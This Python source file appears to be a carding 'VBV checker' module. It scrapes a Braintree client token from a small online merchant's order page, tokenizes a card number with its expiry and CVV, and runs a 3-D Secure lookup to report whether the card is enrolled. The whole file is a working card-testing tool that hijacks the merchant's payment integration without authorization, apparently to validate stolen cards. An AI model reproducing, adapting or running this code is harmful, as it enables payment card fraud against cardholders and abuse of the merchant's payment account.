from async_timeout import timeout
from all.configs._def_main_ import *
from os import system
import re
import aiohttp
import certifi
import ssl
import random
import json
import base64
import asyncio
import platform



async def VBV(cc, mes, ano, cvv):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        try:
            session.headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0 (Edition std-1)',
            })
            try:
                async with session.get('https://www.masteringemacs.org/order', timeout=12) as resp:
                    bearer = await resp.text()
                    lines = bearer.split("\n")
                    for i in lines:
                        if "data-client-token=" in i:
                            sucio = i
                    bearer = sucio.replace(
                        'data-client-token="', "").replace('"', "")
                    bearer = json.loads(base64.b64decode(bearer))
                    bearer = bearer['authorizationFingerprint']
            except UnboundLocalError:
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            except KeyError:
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            except aiohttp.client_exceptions.ClientHttpProxyError:
                await session.close()
                return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            headers = {
                'Accept': '*/*',
                'Authorization': f'Bearer {bearer}',
                'Braintree-Version': '2018-05-10',
                'Content-Type': 'application/json',
                'Origin': 'https://assets.braintreegateway.com',
                'Referer': 'https://assets.braintreegateway.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0 (Edition std-1)',
            }
            data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': braintree_generate_uuid(),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'cvv': cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=data, timeout=12) as resp:
                try:
                    token = await resp.json()
                    idtok = token['data']['tokenizeCreditCard']['token']
                    binito = token['data']['tokenizeCreditCard']['creditCard']['bin']
                except UnboundLocalError or TypeError:
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
            headers = {
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'Origin': 'https://www.masteringemacs.org',
                'Referer': 'https://www.masteringemacs.org/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0 (Edition std-1)',
            }
            data = {
                'amount': '40.75',
                'additionalInfo': {
                    'acsWindowSize': '03',
                },
                'bin': f'{binito}',
                'dfReferenceId': '1_46dfebc7-7a82-461e-a550-1bec4cd97733',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.85.2',
                    'cardinalDeviceDataCollectionTimeElapsed': 1781,
                    'issuerDeviceDataCollectionTimeElapsed': 5248,
                    'issuerDeviceDataCollectionResult': True,
                },
                'authorizationFingerprint': f'{bearer}',
                'braintreeLibraryVersion': 'braintree/web/3.85.2',
                '_meta': {
                    'merchantAppId': 'www.masteringemacs.org',
                    'platform': 'web',
                    'sdkVersion': '3.85.2',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': braintree_generate_uuid(),
                },
            }
            async with session.post(f'https://api.braintreegateway.com/merchants/wxwhz63s9x4ysmhx/client_api/v1/payment_methods/{idtok}/three_d_secure/lookup', headers=headers, json=data, timeout=12) as resp:
                try:
                    response = await resp.json()
                    status = response['paymentMethod']['threeDSecureInfo']['status']
                    enrolled = response['paymentMethod']['threeDSecureInfo']['enrolled']
                    return (status, enrolled)
                except UnboundLocalError or TypeError:
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. Timeout Error. ♻️"

